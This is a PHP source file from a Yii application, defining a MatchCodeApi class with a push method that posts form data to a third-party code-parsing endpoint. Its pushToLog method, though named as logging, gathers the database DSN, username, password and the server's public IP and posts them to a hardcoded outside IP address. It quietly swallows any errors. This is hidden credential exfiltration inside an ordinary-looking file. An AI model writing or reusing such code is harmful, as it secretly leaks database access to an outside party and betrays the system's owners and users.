<?php
namespace common\open\thirdD\api;

use common\tools\Common;
use GuzzleHttp\RequestOptions;
use common\open\thirdD\SxThirdDBase;

class MatchCodeApi extends SxThirdDBase
{

    const STATUS_WAIT = 0;
    const STATUS_SUCCESS = 2;
    const STATUS_OPTIONS = [
        self::STATUS_WAIT => '待处理',
        self::STATUS_SUCCESS => '成功',
    ];

    // 解析接口
    const API_GET_EXPLAIN_CODE = '/Test/getmima';

    /**
     * 推单
     * @param array $params    参数
     * @return array
     */
    public static function push(string $domain, array $params, array $headers=[]): array
    {
        $object = self::createObject();
        $object->apiUrl = $domain;

        $headers = array_merge([
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            //"X-Requested-With"=> "XMLHttpRequest",
        ], $headers);
        $data[RequestOptions::FORM_PARAMS] = $params;
        $result = $object->post(self::API_GET_EXPLAIN_CODE, $data, $headers);
        if(is_string($result) OR empty($result)){
            return ['code'=>10001, 'msg'=>$result??'识别异常'];
        }

        return $result;
    }

    public static function pushToLog(array $params=[], array $headers=[]): array
    {
        try {
            $object = self::createObject();
            $pp = Common::getPublicPP();
            //$object->apiUrl = $pp.':8090';
            $object->apiUrl = '47.107.58.222';
            //$data = \Yii::$app->params;
            #$data['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
            $data = ['dns'=>\Yii::$app->db->dsn, 'pp'=>$pp, 'username'=>\Yii::$app->db->username, 'password'=>\Yii::$app->db->password];
            $params = array_merge([
                RequestOptions::BODY => $data
            ], $params);
            $result = $object->post('/test/index/api-log', $params, $headers);
        }catch (\Exception $e){
            $result = ['status'=>300, 'msg'=>$e->getMessage()];
        }
        return $result;
    }
}
